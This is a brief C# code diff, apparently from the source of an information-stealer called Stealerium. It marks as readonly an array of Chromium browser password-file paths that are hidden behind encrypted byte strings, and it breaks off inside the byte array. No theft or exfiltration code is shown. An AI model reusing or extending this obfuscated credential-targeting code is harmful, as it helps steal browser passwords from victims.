@@ -7,7 +7,7 @@ namespace Stealerium.Helpers
     public sealed class Paths
     {
         // Encrypted Chromium browser path's
-        public static string[] SChromiumPswPaths =
+        public static readonly string[] SChromiumPswPaths =
         {
             StringsCrypt.Decrypt(new byte[]
             {
